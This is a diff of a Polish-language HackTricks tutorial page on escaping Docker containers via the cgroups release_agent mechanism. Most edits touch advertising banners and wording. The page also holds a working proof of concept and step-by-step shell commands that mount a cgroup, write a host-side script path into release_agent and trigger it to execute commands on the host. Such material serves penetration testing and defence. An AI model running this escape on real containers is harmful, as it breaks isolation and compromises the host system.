@@ -1,18 +1,19 @@
 # Ucieczka z cgroups Docker release\_agent
 
+{% hint style="success" %}
+Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ### [WhiteIntel](https://whiteintel.io)
 
@@ -22,7 +23,7 @@ Inne sposoby wsparcia HackTricks:
 
 Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.
 
-Możesz odwiedzić ich stronę internetową i wypróbować ich silnik **za darmo** pod adresem:
+Możesz odwiedzić ich stronę internetową i wypróbować ich silnik za **darmo** na:
 
 {% embed url="https://whiteintel.io" %}
 
@@ -38,23 +39,23 @@ t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-### Dowód koncepcji (PoC) demonstruje metodę wykorzystania cgroups poprzez utworzenie pliku `release_agent` i wywołanie go w celu wykonania dowolnych poleceń na hoście kontenera. Oto podział na kroki zaangażowane:
+Dowód koncepcji (PoC) demonstruje metodę wykorzystania cgroups poprzez utworzenie pliku `release_agent` i wywołanie go w celu wykonania dowolnych poleceń na hoście kontenera. Oto podział kroków zaangażowanych:
 
-1. **Przygotowanie środowiska:**
-* Utworzono katalog `/tmp/cgrp` jako punkt montowania dla cgroup.
+1. **Przygotuj środowisko:**
+* Utwórz katalog `/tmp/cgrp` jako punkt montowania dla cgroup.
 * Kontroler cgroup RDMA jest montowany do tego katalogu. W przypadku braku kontrolera RDMA zaleca się użycie kontrolera cgroup `memory` jako alternatywy.
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
 2. **Skonfiguruj podrzędny Cgroup:**
 * Wewnątrz zamontowanego katalogu cgroup tworzony jest podrzędny cgroup o nazwie "x".
-* Włączenie powiadomień dla cgroup "x" poprzez zapisanie wartości 1 do pliku notify\_on\_release.
+* Włączone są powiadomienia dla cgroup "x", poprzez zapisanie wartości 1 do pliku notify\_on\_release.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **Skonfiguruj agenta wydania:**
 * Ścieżka kontenera na hoście jest pobierana z pliku /etc/mtab.
-* Następnie plik release\_agent cgroup jest skonfigurowany do wykonania skryptu o nazwie /cmd znajdującego się pod uzyskaną ścieżką hosta.
+* Następnie plik release\_agent cgroup jest skonfigurowany do wykonania skryptu o nazwie /cmd znajdującego się w uzyskanej ścieżce hosta.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
@@ -67,7 +68,7 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
 5. **Wywołaj atak:**
-* Proces jest uruchamiany w obrębie grupy potomnej "x" i natychmiast jest zatrzymywany.
+* Proces zostaje uruchomiony w obrębie grupy potomnej "x" i natychmiast zostaje zakończony.
 * To powoduje uruchomienie `release_agent` (skryptu /cmd), który wykonuje polecenie ps aux na hoście i zapisuje wynik do /output wewnątrz kontenera.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
@@ -84,16 +85,17 @@ Możesz odwiedzić ich stronę internetową i wypróbować ich silnik za **darmo
 
 {% embed url="https://whiteintel.io" %}
 
+{% hint style="success" %}
+Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
+{% endhint %}
